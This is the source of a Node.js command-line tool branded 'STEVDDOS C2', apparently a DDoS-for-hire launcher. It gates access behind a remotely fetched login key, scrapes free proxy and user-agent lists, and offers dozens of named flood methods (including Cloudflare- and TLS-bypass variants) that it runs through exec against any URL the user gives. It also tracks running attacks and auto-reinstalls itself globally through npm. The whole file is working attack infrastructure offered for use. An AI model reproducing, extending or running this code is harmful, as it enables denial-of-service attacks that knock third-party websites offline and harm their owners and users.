#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀𝑺𝑻𝑬𝑽𝑫𝑫𝑶𝑺🕊️🪽 𝑪2 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 ${version}
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀𝙾𝚠𝚗𝚎𝚛: 𝐒𝐓𝐄𝐕𝐄𝐍•𝐒𝐓𝐎𝐑𝐄🕊️🪽
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀𝙿𝚛𝚎𝚖𝚒𝚞𝚖: 𝚈𝚎𝚜
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀𝚈𝚘𝚞𝚝𝚞𝚋𝚎: https://youtube.com/@steven-storee
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖: @stevenstoree
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄𝙼𝚢 𝚃𝚎𝚊𝚖: @TPC INDONESIA
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://pastebin.com/raw/bz3pV5NJ');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/WhiteXbec/R3X/refs/heads/main/ngeri.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31m𝚂𝚃𝙴𝚅𝙳𝙳𝙾𝚂🕊️🪽 𝚂𝚎𝚌𝚞𝚛𝚒𝚝𝚢\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚃𝚘 𝚂𝚃𝙴𝚅𝙳𝙳𝙾𝚂🕊️🪽 ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`𝙺𝚎𝚝𝚒𝚔 "𝙼𝚎𝚗𝚞" 𝙵𝚘𝚛 𝚂𝚑𝚘𝚠 𝙰𝚕𝚕 𝙲𝚘𝚖𝚖𝚊𝚗𝚍`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 9000);
}
// [========================================] //
function monitorAttack() {
  console.log("\n𝙼𝚘𝚗𝚒𝚝𝚘𝚛 𝙰𝚝𝚝𝚊𝚌𝚔:\n");
  processList.forEach((process) => {
console.log(`𝚃𝚊𝚛𝚐𝚎𝚝: ${process.target}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜: ${process.methods}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗𝚜: ${process.duration} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
𝚂𝚒𝚗𝚌𝚎𝚜: ${Math.floor((Date.now() - process.startTime) / 9000)} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚐𝚘\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url/ip> <duration> <methods>
attack https://xnxx.com 500 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄.
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋.⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[===============𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙀𝘽𝙎𝙄𝙏𝙀 𝘽𝙔 𝙎𝙏𝙀𝙑𝙀𝙉•𝙎𝙏𝙊𝙍𝙀🕊️🪽===============]
𝚃𝚊𝚛𝚐𝚎𝚝   : ${target}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗  : ${duration}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜  : ${methods}
𝙰𝚂       : ${result.as}
𝙸𝙿       : ${result.query}
𝙸𝚂𝙿      : ${result.isp}
𝙼𝚈 𝚃𝙴𝙰𝙼 : @TPC INDONESIA
𝙾𝚆𝙽𝙴𝚁 𝚃𝙾𝙾𝙻𝚂 : @stevenstoree
𝚈𝙾𝚄𝚃𝚄𝙱𝙴 : https://youtube.com/@steven-storee
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt flood`)
	sigma()
  } else if (methods === 'stev-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'stev-traffic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} GET 3`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'steven') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3`)
	sigma()
  } else if (methods === 'mixmax') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'tpc') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80`)
	sigma()
	} else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt 80`)
	sigma()
  } else if (methods === '404') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
  } else if (methods === 'aqua') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'astral') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'barave') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'bomba') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'bot') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'brow-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'browserddos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-saturn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-test') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'cfa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'cfbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80`)
	sigma()
	} else if (methods === 'dev') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'dos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'downrapid') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
	sigma()
	} else if (methods === 'dragonc2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'esic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'flood-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 80 3`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 3 80 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 80 3`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 3 proxy.txt 80 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 80 3 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 80 3 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 80 3 proxy.txt`)
        exec(`node ${rape} ${duration} 3 proxy.txt 80 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 𝐒𝐓𝐄𝐕𝐄𝐍•𝐒𝐓𝐎𝐑𝐄🕊️🪽

𝚃𝚑𝚊𝚗𝚔𝚜 𝚃𝚘:
𝚃𝚞𝚑𝚊𝚗
𝙾𝚛𝚝𝚞
𝚁3𝚡/𝚁𝙴𝚇
𝚂𝚃𝙴𝚅𝙴𝙽•𝚂𝚃𝙾𝚁𝙴🕊️🪽
𝙴𝙻𝙰𝙽𝙶 𝚂𝚄𝙺𝙰 𝚃𝙾𝙱𝚁𝚄𝚃
𝙵𝙾𝚇𝙲𝙻𝙰𝚈 𝚃𝚉𝚈
𝚂𝚃𝚁𝙴𝚃 𝙲2
𝚈𝚄𝙳𝙰•𝙼𝙾𝙳𝚂〽️
𝚃𝙰𝙼𝙰 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴
𝙽𝙰𝚈𝙻𝙰
𝙳𝚈𝚉 𝙷𝙴𝙽𝙶𝙺𝙴𝚁
𝙻𝙾𝚈𝙳•𝚃𝚉𝚈
𝙰𝙻𝙻 𝚃𝙴𝙰𝙼
𝙰𝙻𝙻 𝙵𝚁𝙸𝙴𝙽𝙳
𝙰𝙻𝙻 𝙲𝚁𝙴𝙰𝚃𝙾𝚁
𝙼𝚈 𝚂𝚄𝙱𝚂𝙲𝚁𝙸𝙱𝙴𝚁
`
permen.question('[\x1b[1m\x1b[32m𝚂𝚃𝙴𝚅𝙳𝙳𝙾𝚂🕊️🪽\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[====================METHODS DDoS====================]
|| 404     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| aqua     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| astral     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| barave     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bomba     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bot     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| brow-x     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| browserddos     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bypass-saturn     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bypass-test     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bypass-x     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| cfa     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| cfbypass     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| dev     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| dos     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| downrapid     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| dragonc2     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| esic     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| flood      || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| flood-bypass     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tls        || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| strike     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| kill       || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| raw        || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| bypass     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| thunder    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| storm      || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| rape       || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| destroy    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| slim       || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| skynet-tls || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| glory      || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| mixsyn     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| mix        || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| pidoras     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tpc        || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| geckold    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| lezkill    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tls-vip    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tls-bypass || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| killer     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| mixmax      || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| xlamper    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| steven        || DDoS WEBSITE BY STEVEN•STORE🕊🪽 (New Methods)
|| inferno    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| xlamper-bom|| DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tornado    || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| tlsv1      || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| medusa     || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| uam        || DDoS WEBSITE BY STEVEN•STORE🕊🪽
|| stev-traffic|| DDoS WEBSITE BY STEVEN•STORE🕊🪽 (New Methods)
|| stev-flood  || DDoS WEBSITE BY STEVEN•STORE🕊🪽 (New Methods)
|| night-flood|| DDoS WEBSITE BY STEVEN•STORE🕊🪽 (Owner Only)
|| night-bypas|| DDoS WEBSITE BY STEVEN•STORE🕊🪽 (Owner Only)
[====================METHODS DDoS====================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()